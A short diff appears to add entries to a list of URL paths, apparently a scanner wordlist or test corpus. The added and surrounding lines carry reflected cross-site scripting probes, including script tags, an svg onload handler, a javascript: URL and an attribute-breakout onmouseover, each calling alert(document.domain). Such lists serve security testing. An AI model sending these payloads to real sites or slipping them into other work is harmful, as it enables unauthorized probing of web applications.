@@ -695,3 +695,5 @@
 /doku.php?id=start&do=search&q=the%20%40%3Csvg%2Fonload%3Dalert%60document.domain%60%3E
 /healthz
 /workspace?url=javascript%3Aalert%28document.domain%29
+/examples/jsp/num/numguess.jsp?guess=5&hint=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/NoSuchPage/widget?id=%22%20onmouseover=%22alert(document.domain)%22%20x=%22
